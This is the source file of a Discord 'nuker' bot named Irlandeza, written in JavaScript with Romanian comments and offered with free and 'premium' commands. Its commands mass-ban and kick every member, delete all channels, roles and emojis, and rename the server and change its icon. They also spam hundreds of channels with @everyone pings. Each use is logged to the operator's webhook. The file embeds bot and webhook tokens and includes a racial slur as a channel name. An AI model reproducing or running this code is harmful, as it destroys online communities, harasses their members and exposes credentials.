const { Client, WebhookClient, Intents, MessageEmbed, version: djsversion } = require('discord.js')
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const db = require("quick.db")

client.on("ready", async () => {
  console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers`);
client.user.setActivity("KILLING UR SERVERS", {
    type:"STREAMING",
    url: "https://www.twitch.tv/irlandezabot"
});
let matatactu = new MessageEmbed()
.setColor("#0d0d0d")
.setDescription(`The bot was reconnected to the host`);

const wrb = new WebhookClient({id: "897189289979416586", token: "UEytdVTfUajc44c1waqVpH8Lxnx-vwba2--pMOhml_zocz2dParnibbRkjL8DheDkKcw"});
await wrb.send({ embeds: [matatactu]})

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" server >> " + guild.name + " - members " + guild.memberCount)
    })
});



client.on("message", async message => {

  if (message.author.bot) return;

  if (message.content.startsWith('commands')) {
    const helpEmbed = new MessageEmbed()
      .setTitle('Irlandeza Commands')
      .setDescription(` __Free Commands__

serverdead > __Destroy the server__
everyonedead > __Banning all members__

      __Premium Commands__

nuke > __Mass ping & channels ; destroy __
banv2 > __Ban all members | speed x5 __
spamchannels > __Mass channels & ping __
sn > __Change server icon __`)
    message.channel.send({embeds: [helpEmbed]})
  }


  if (message.content.startsWith('ping')) {
    const helpEmbed = new MessageEmbed()
      .setTitle('Irlandeza Ping')
      .setDescription(`
Bot Latency: ${Math.round(client.ws.ping)}ms.\nAPI Latency: ${Date.now() - message.createdTimestamp}ms.`)
      .setFooter(`Irlandeza Ping`)
    message.channel.send({embeds: [helpEmbed]})
  }


//invite
  if (message.content.startsWith('invite')) {
    const helpEmbed = new MessageEmbed()
      .setTitle('Bot Invite Link')
      .setDescription(`The invite link is here [LINK](https://discord.com/api/oauth2/authorize?client_id=897116526241533962&permissions=8&scope=bot)

Use command "help" to see all the commands!`)
    message.channel.send({embeds: [helpEmbed]})
  }

if (message.content.startsWith("rmv premium")) {

        const embed = new MessageEmbed()
        .setDescription(`No more **Premium**`)
    
        .setColor("0d0d0d")
           let ownerID = "797137705150578728"
  if(message.author.id !== ownerID) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.delete(`dev_${user.id}`, 1)
        const tactuEmbed = new MessageEmbed()
    .setTitle(':white_check_mark: User removed from premium')
    message.channel.send({embeds: [tactuEmbed]})
    user.send(embed)
  }

  if (message.content.startsWith("add premium")) {
        const embed = new MessageEmbed()
      .setColor("#0d0d0d")
      .setDescription(`You have premium now **Premium**!`);
         let ownerID = "797137705150578728"
  if(message.author.id !== ownerID) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    const mataEmbed = new MessageEmbed()
    .setTitle(':white_check_mark: User added to premium')
    message.channel.send({embeds: [mataEmbed]})
    user.send(embed)
  }

//icon set
  if (message.content.startsWith('sn')) {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    let Embed4 = new MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`U dont have permission.`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send({embeds: [Embed4]})

      message.guild.setIcon('https://i.imgur.com/pZ3z9nv.png') // changes server pfp
      message.delete();
      let pula = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **.sn** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
        const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");
  
      await wrb.send(pula)

  }


  // Mass Ban
  if (message.content.startsWith('banv2')) {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    message.delete();
    let tatata = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **banv2** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
      const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");
    await wrb.send(tatata)
    let Embed4 = new MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`U dont have permission.`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send({embeds: [Embed4]})
  
    message.guild.members.cache.forEach(member => member.ban({ reason: "Irlandeza was here." })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning the server")
      ))
      
}

  // Mass Ban
  if (message.content.startsWith('everyonedead')) {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    message.delete();
    let hadad = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **everyonedead** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
      const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");
    await wrb.send(hadad)
    let Embed4 = new MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`U dont have permission.`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send({embeds: [Embed4]})
    message.guild.members.cache.forEach(member => member.ban({ reason: "Irlandeza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning the server")

      ))
      
}

  // Mass Channels      


  if (message.content.startsWith('serverdead')) {
    
  if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    message.delete();






    // Channel Delete

    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`RIP Channel`))
    )); // deletes all channels
    message.delete();



    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "Irlandeza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning the server")

      ))

    let mes = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **amin** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
      const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");

    await wrb.send(mes)

    // Kick All


    message.guild.members.cache.forEach(member => member.kick({ reason: "Irlandeza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning the server")

      ));




    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })




    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Irlandeza Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))




    // Death.


    message.guild.setName(`Server Inchis`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://i.imgur.com/pZ3z9nv.png') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} got deleted`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Irlandeza was here" }).then(console.log(yellow(`EMOJI: ${e.name} got deleted`))))





  }


})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hello, World!');
}
const server = http.createServer(requestListener); 
server.listen(8080);




client.login('ODk3MTE2NTI2MjQxNTMzOTYy.YWQ-3w.5XLPL_AYcg9sgREvzzO09YZ17v4')



client.on('message', async (message) => {
  if (message.content === 'nuke') {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces.")
    message.guild.channels.cache.forEach(channel => channel.delete());


    message.guild.roles.cache.forEach(role => role.delete());
    message.guild.members.cache.forEach(member => member.ban({ reason: "Irlandeza was here" }))
    let da = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **nuke** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
      const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");


    await wrb.send(da)

    await message.guild.channels.create(`FUCK-YOU`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})

client.on('message', async (message) => {
  if (message.content.startsWith('premium')) {
    
    
        let Embed4 = new MessageEmbed()
        .setColor("#0d0d0d")
        .setDescription(`U dont have permission.`);
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send({embeds: [Embed4]})
          
                       if(message.guild.id == '897112876857303102') return message.channel.send('U dont have acces.');
    
                if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                } else {
                      let channels =  message.guild.channels.cache.array();
                         message.guild.channels.cache.array().forEach(channel => {
          channel.delete();
        });
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 200; i++) {
                            message.guild.channels.create('IRLANDEZA-FUCKED-YOU')
                            message.guild.members.cache.forEach(member => member.ban({ reason: 'Banned by Irlandeza'}))
    
                            for (var i = 0; i < 200; i++) {
                                let channels = message.guild.channels.create('spartanu va dat la muie')
    
                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log((`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }
    
                        }
    
                    }
    
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)
    
                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(`CHANNEL PINGED!`);
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
                message.delete();
       
            }            
     })

client.on('message', async (message) => {
  if (message.content === '@everyone') {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    await message.guild.channels.create(`papa-server`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
  })
  }
})

//ok fac ceva misto
client.on('message', async (message) => {
  if (message.content === 'spamchannels') {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    let dadada = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **spamchannels** on the server **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members`;
      const wrb = new WebhookClient("897118374398664754", "PauLTqxgfMmKDOcHenAyj2RT2HExfxTIvmwE1FidxvkIL64sWuDmW9Yxc_2-mJqyLmAX");

    await wrb.send(dadada)
    await message.guild.channels.create(`FUCK-YOU`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content === '@everyone') {
    if (message.guild.id === "897112876857303102") return message.channel.send("U dont have acces boy")
    await message.guild.channels.create(`RIP-NIGGA`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
    message.channel.send('@everyone https://discord.gg/ZJ3nspQcJb Irlandeza BEST BOT')
  })
  }
})